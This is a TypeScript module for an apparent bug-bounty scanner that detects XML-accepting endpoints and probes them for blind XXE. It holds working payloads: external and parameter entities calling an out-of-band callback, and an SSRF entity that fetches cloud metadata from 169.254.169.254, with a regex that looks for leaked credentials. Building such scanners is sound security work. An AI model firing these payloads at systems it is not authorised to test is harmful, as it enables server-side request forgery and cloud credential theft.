import { scopedHttp } from "../net/scoped-http";
import logger from "../../utils/logger";
import { callbackServer } from "../oob/callback-server";

interface XXEVuln {
  endpoint: string;
  technique: "oob_dtd" | "parameter_entity" | "ssrf_via_xxe" | "file_disclosure";
  beaconId: string;
  oobReceived: boolean;
  severity: "critical" | "high";
  detail: string;
}

interface XXEProbeResult {
  xmlEndpointsFound: string[];
  vulns: XXEVuln[];
  hypotheses: Array<{ vulnClass: string; reasoning: string; confidence: number; priority: number; endpoint: string; raw: XXEVuln }>;
}

const XML_PROBE_PATHS = [
  "",
  "/api",
  "/api/v1",
  "/upload",
  "/import",
  "/api/import",
  "/parse",
  "/api/parse",
  "/soap",
  "/ws",
  "/api/xml",
];

const BENIGN_XML = '<?xml version="1.0"?><test>hello</test>';


function buildOobDtdPayload(callbackUrl: string): string {
  return `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${callbackUrl}">]>\n<root>&xxe;</root>`;
}

function buildParameterEntityPayload(callbackUrl: string): string {
  return `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "${callbackUrl}">%xxe;]>\n<root>test</root>`;
}

function buildSsrfPayload(): string {
  return `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<root>&ssrf;</root>`;
}

class BlindXXEProber {
  async probe(targetUrl: string, authHeaders?: Record<string, string>, programId?: number): Promise<XXEProbeResult> {
    const result: XXEProbeResult = {
      xmlEndpointsFound: [],
      vulns: [],
      hypotheses: [],
    };

    const base = targetUrl.replace(/\/$/, "");

    // Step 1 — detect XML-consuming endpoints
    for (const path of XML_PROBE_PATHS) {
      const url = path === "" ? base : `${base}${path}`;
      try {
        const resp = await scopedHttp.post(url, BENIGN_XML, {
          headers: {
            "Content-Type": "application/xml",
            ...authHeaders,
          },
          timeout: 8000,
          validateStatus: () => true,
        }, programId);
        if (resp.status !== 404 && resp.status !== 405) {
          logger.debug("[BlindXXEProber] XML endpoint candidate", { url, status: resp.status });
          result.xmlEndpointsFound.push(url);
        }
      } catch (err) {
        logger.debug("[BlindXXEProber] Endpoint probe error", { url, err: (err as Error).message });
      }
    }

    logger.info("[BlindXXEProber] XML endpoints found", { count: result.xmlEndpointsFound.length });

    // Step 2 — test each XML endpoint with XXE payloads
    for (const endpoint of result.xmlEndpointsFound) {
      await this.tryOobDtd(endpoint, authHeaders ?? {}, result, programId);
      await this.tryParameterEntity(endpoint, authHeaders ?? {}, result, programId);
      await this.trySsrfViaXxe(endpoint, authHeaders ?? {}, result, programId);
    }

    return result;
  }

  private async tryOobDtd(
    endpoint: string,
    authHeaders: Record<string, string>,
    result: XXEProbeResult,
    programId?: number
  ): Promise<void> {
    const { beaconId, callbackUrl } = callbackServer.generateBeacon();
    const payload = buildOobDtdPayload(callbackUrl);
    try {
      const resp = await scopedHttp.post(endpoint, payload, {
        headers: { "Content-Type": "application/xml", ...authHeaders },
        timeout: 8000,
        validateStatus: () => true,
      }, programId);

      const oobReceived = (await callbackServer.waitForHit(beaconId, 10000)) !== null;

      if (oobReceived) {
        const detail = `OOB callback received for OOB DTD XXE at ${endpoint} (beacon: ${beaconId})`;
        logger.warn("[BlindXXEProber] XXE vuln detected (oob_dtd)", { endpoint, oobReceived, severity: "critical" });
        const vuln: XXEVuln = { endpoint, technique: "oob_dtd", beaconId, oobReceived, severity: "critical", detail };
        result.vulns.push(vuln);
        // raw: the vuln itself, including the beaconId — an actual, unforgeable
        // OOB callback hit, the strongest evidence class in this codebase.
        // HunterEngine attaches this so the PROBE phase recognizes it as
        // already confirmed rather than re-dispatching to nuclei's generic
        // "xxe" tag, which can't replay this specific beacon confirmation.
        result.hypotheses.push({ vulnClass: "xxe", reasoning: detail, confidence: 0.9, priority: 10, endpoint, raw: vuln });
      } else {
        logger.debug("[BlindXXEProber] oob_dtd: no OOB callback", { endpoint });
      }
    } catch (err) {
      logger.debug("[BlindXXEProber] oob_dtd probe error", { endpoint, err: (err as Error).message });
    } finally {
      callbackServer.cleanup(beaconId);
    }
  }

  private async tryParameterEntity(
    endpoint: string,
    authHeaders: Record<string, string>,
    result: XXEProbeResult,
    programId?: number
  ): Promise<void> {
    const { beaconId, callbackUrl } = callbackServer.generateBeacon();
    const payload = buildParameterEntityPayload(callbackUrl);
    try {
      const resp = await scopedHttp.post(endpoint, payload, {
        headers: { "Content-Type": "application/xml", ...authHeaders },
        timeout: 8000,
        validateStatus: () => true,
      }, programId);

      const oobReceived = (await callbackServer.waitForHit(beaconId, 10000)) !== null;

      if (oobReceived) {
        const detail = `OOB callback received for parameter entity XXE at ${endpoint} (beacon: ${beaconId})`;
        logger.warn("[BlindXXEProber] XXE vuln detected (parameter_entity)", { endpoint, oobReceived, severity: "critical" });
        const vuln: XXEVuln = { endpoint, technique: "parameter_entity", beaconId, oobReceived, severity: "critical", detail };
        result.vulns.push(vuln);
        result.hypotheses.push({ vulnClass: "xxe", reasoning: detail, confidence: 0.9, priority: 10, endpoint, raw: vuln });
      } else {
        logger.debug("[BlindXXEProber] parameter_entity: no OOB callback", { endpoint });
      }
    } catch (err) {
      logger.debug("[BlindXXEProber] parameter_entity probe error", { endpoint, err: (err as Error).message });
    } finally {
      callbackServer.cleanup(beaconId);
    }
  }

  private async trySsrfViaXxe(
    endpoint: string,
    authHeaders: Record<string, string>,
    result: XXEProbeResult,
    programId?: number
  ): Promise<void> {
    // SSRF via XXE uses a fixed target (cloud metadata); no OOB beacon needed
    const beaconId = `ssrf-${endpoint}`;
    const payload = buildSsrfPayload();
    try {
      const resp = await scopedHttp.post(endpoint, payload, {
        headers: { "Content-Type": "application/xml", ...authHeaders },
        timeout: 8000,
        validateStatus: () => true,
      }, programId);

      const body = typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data);

      // OOB is not applicable here; require actual cloud metadata leakage in body
      const ssrfLeak = /ami-id|instance-id|security-credentials|computeMetadata|instanceId|publicIpv4|AccessKeyId|privateIpAddress/i.test(body);

      if (ssrfLeak) {
        const detail = `Cloud metadata leaked via SSRF-via-XXE at ${endpoint} — instance metadata in response body`;
        logger.warn("[BlindXXEProber] XXE vuln detected (ssrf_via_xxe)", { endpoint, ssrfLeak, severity: "critical" });
        const vuln: XXEVuln = { endpoint, technique: "ssrf_via_xxe", beaconId, oobReceived: true, severity: "critical", detail };
        result.vulns.push(vuln);
        result.hypotheses.push({ vulnClass: "xxe", reasoning: detail, confidence: 0.9, priority: 10, endpoint, raw: vuln });
      } else {
        logger.debug("[BlindXXEProber] ssrf_via_xxe: no metadata leak", { endpoint });
      }
    } catch (err) {
      logger.debug("[BlindXXEProber] ssrf_via_xxe probe error", { endpoint, err: (err as Error).message });
    }
  }
}

export const blindXXEProber = new BlindXXEProber();
